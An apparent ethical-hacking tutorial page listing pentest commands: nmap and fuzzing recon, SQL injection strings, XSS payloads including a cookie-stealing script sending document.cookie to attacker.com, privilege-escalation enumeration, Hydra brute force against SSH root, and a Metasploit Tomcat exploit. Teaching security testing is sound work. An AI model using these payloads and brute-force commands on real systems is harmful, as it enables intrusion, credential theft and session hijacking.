⚖ Ethical Hacking — Hands-On Labs

Practical penetration testing labs. You'll learn real tools and techniques used by professional ethical hackers. Every section includes commands you can run, tools to use, and concepts to understand.

1. Reconnaissance (Information Gathering)

Before attacking, gather intel on your target. This is the first phase of any pentest.

Nmap — Network Scanning

# Basic port scan
nmap -sV target.com

# Aggressive scan with OS detection
nmap -A -T4 target.com

# Scan all ports
nmap -p- target.com

# Discover live hosts on a network
nmap -sn 192.168.1.0/24

Subdomain Enumeration

# Using subfinder
subfinder -d target.com

# Using ffuf for subdomain fuzzing
ffuf -w /usr/share/wordlists/subdomains.txt -u https://FUZZ.target.com

Directory & File Discovery

# Using gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt

# Using ffuf for directory fuzzing
ffuf -w /usr/share/wordlists/common.txt -u https://target.com/FUZZ

2. Web Application Testing

SQL Injection Detection

# Manual test — try in URL/search bars
' OR '1'='1
' OR 1=1 --
" OR 1=1 --
admin' --

# Using sqlmap
sqlmap -u "https://target.com/page?id=1" --dbs

Cross-Site Scripting (XSS)

# Basic test payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Cookie stealing payload
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

Burp Suite Basics

1. Set your browser proxy to 127.0.0.1:8080
2. Go to Proxy > Intercept tab
3. Turn Intercept ON
4. Browse the target site — requests pause for inspection
5. Send to Repeater to modify and resend requests
6. Check Response tab for vulnerabilities

3. Privilege Escalation (Linux)

After gaining initial access, you need to become root.

Enumeration Commands

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check kernel version for exploits
uname -a

# Look for interesting files
find / -type f -name "*.txt" 2>/dev/null
find / -type f -name "*.conf" 2>/dev/null

# Check cron jobs
cat /etc/crontab

4. Password Cracking

John the Ripper

# Crack a shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

Hydra — Brute Force

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Web form brute force
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

5. Exploit Development Basics

Metasploit Framework

# Start msfconsole
msfconsole

# Search for exploits
search apache tomcat

# Use an exploit
use exploit/multi/http/tomcat_mgr_upload

# Set options
show options
set RHOSTS target.com
set RPORT 8080

# Run
exploit
